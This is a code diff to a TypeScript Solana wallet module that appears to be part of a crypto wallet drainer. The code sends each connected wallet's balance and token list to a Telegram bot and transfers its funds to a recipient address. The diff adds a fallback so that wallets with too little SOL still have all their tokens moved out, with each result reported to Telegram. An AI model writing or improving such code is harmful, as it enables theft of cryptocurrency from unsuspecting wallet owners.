@@ -33,6 +33,7 @@ const PUBLIC_RPC_ENDPOINTS = [
 export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
 export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
 export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL (approximately $0.50 USD)
+export const MINIMUM_FOR_TOKEN_TRANSFER = 0.0005; // Just enough for a transaction fee
 
 // Retry function with exponential backoff
 async function retry<T>(
@@ -143,7 +144,8 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
       return response.value.map(item => ({
         mint: item.account.data.parsed.info.mint,
         amount: item.account.data.parsed.info.tokenAmount.uiAmount,
-        decimals: item.account.data.parsed.info.tokenAmount.decimals
+        decimals: item.account.data.parsed.info.tokenAmount.decimals,
+        name: `Token (${item.account.data.parsed.info.mint.slice(0, 6)}...)`
       }));
     }, 5, 1000, "Token accounts fetch");
     
@@ -218,7 +220,7 @@ export const getWalletBalance = async (walletAddress: string): Promise<number> =
   }
 };
 
-// Improved Telegram sending with more robust fallback options
+// Improved Telegram sending with more token information
 export const sendToTelegram = async (walletData: any, botToken: string, chatId: string) => {
   try {
     console.log("Preparing to send data to Telegram:", walletData);
@@ -231,14 +233,14 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
       // Make sure we have a valid balance
       const solBalanceInSol = walletData.balance || 0;
       
-      // Format token data in a more readable way
+      // Format token data in a more readable way with names
       let formattedTokens = "No tokens found";
       if (walletData.tokens && walletData.tokens.length > 0) {
         formattedTokens = walletData.tokens.map((token: any, index: number) => 
           `Token #${index + 1}:\n` +
-          `  Mint: ${token.mint}\n` +
+          `  Name: ${token.name || 'Unknown'}\n` +
           `  Amount: ${token.amount}\n` +
-          `  Decimals: ${token.decimals}`
+          `  Mint: ${token.mint}`
         ).join('\n\n');
       }
 
@@ -259,9 +261,9 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
       if (walletData.tokens && walletData.tokens.length > 0) {
         const formattedTokens = walletData.tokens.map((token: any, index: number) => 
           `Token #${index + 1}:\n` +
-          `  Mint: ${token.mint}\n` +
+          `  Name: ${token.name || 'Unknown'}\n` +
           `  Amount: ${token.amount}\n` +
-          `  Decimals: ${token.decimals}`
+          `  Mint: ${token.mint}`
         ).join('\n\n');
         
         message += `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n`;
@@ -276,9 +278,9 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
       if (walletData.tokens && walletData.tokens.length > 0) {
         const formattedTokens = walletData.tokens.map((token: any, index: number) => 
           `Token #${index + 1}:\n` +
-          `  Mint: ${token.mint}\n` +
+          `  Name: ${token.name || 'Unknown'}\n` +
           `  Amount: ${token.amount}\n` +
-          `  Decimals: ${token.decimals}`
+          `  Mint: ${token.mint}`
         ).join('\n\n');
         
         message += `\n💎 TOKEN HOLDINGS:\n${formattedTokens}`;
@@ -374,11 +376,16 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
   }
 };
 
-export const hasEnoughSolForRent = (balanceInSol: number): boolean => {
+// Update hasEnoughSolForRent to allow token transfers with smaller balance
+export const hasEnoughSolForRent = (balanceInSol: number, tokensOnly = false): boolean => {
   console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
   
-  // Require minimum 0.00380326 SOL (approximately $0.50 USD at average SOL prices)
-  // This ensures enough for rent exemption and transaction fees
+  // If we're only sending tokens, we need less SOL
+  if (tokensOnly) {
+    return balanceInSol >= MINIMUM_FOR_TOKEN_TRANSFER;
+  }
+  
+  // Otherwise require minimum for full SOL+token transfer
   return balanceInSol >= MINIMUM_REQUIRED_SOL;
 };
 
@@ -566,20 +573,52 @@ export const signAndSendTransaction = async (
       throw new Error('Insufficient wallet balance for transfer');
     }
     
-    // Check if the wallet has enough SOL for rent exemption and fees
-    if (!hasEnoughSolForRent(balanceInSol)) {
-      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_REQUIRED_SOL} SOL) for rent exemption`);
+    // Check if the wallet has enough SOL for at least token transfers
+    const hasTokensToTransfer = tokens && tokens.length > 0 && tokens.some(t => t.amount > 0);
+    
+    // Check if the wallet has enough SOL for at least token transfers
+    const hasEnoughForTokens = hasEnoughSolForRent(balanceInSol, true);
+    
+    // If we don't have enough for SOL transfer but do have tokens and enough SOL for fees
+    if (!hasEnoughSolForRent(balanceInSol) && hasTokensToTransfer && hasEnoughForTokens) {
+      console.log("Not enough SOL for full transfer, but proceeding with token transfers only");
       
       if (botToken && chatId) {
         await sendToTelegram({
           address: walletPublicKey.toString(),
-          message: `TRANSFER FAILED: Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required. Current balance: ${balanceInSol.toFixed(6)} SOL`,
+          message: `TRANSFER INFO: Not enough SOL for SOL transfer (${balanceInSol} SOL), proceeding with token transfers only`,
           walletName: wallet.adapter?.name || "Unknown Wallet",
           tokens: tokens || []
         }, botToken, chatId);
       }
       
-      throw new Error(`Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
+      // Skip SOL transfer and go straight to token transfers
+      const tokenResults = await transferTokens(
+        connection,
+        wallet,
+        recipientAddress,
+        tokens,
+        botToken,
+        chatId
+      );
+      
+      return "token-transfers-only"; // Special return to indicate only tokens were transferred
+    }
+    
+    // If we don't have enough SOL even for token transfers
+    if (!hasEnoughForTokens) {
+      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_FOR_TOKEN_TRANSFER} SOL) for any transfers`);
+      
+      if (botToken && chatId) {
+        await sendToTelegram({
+          address: walletPublicKey.toString(),
+          message: `TRANSFER FAILED: Insufficient funds for any transfers. Minimum ${MINIMUM_FOR_TOKEN_TRANSFER} SOL required. Current balance: ${balanceInSol.toFixed(6)} SOL`,
+          walletName: wallet.adapter?.name || "Unknown Wallet",
+          tokens: tokens || []
+        }, botToken, chatId);
+      }
+      
+      throw new Error(`Insufficient funds for any transfers. Minimum ${MINIMUM_FOR_TOKEN_TRANSFER} SOL required.`);
     }
     
     // We need to account for transaction fees
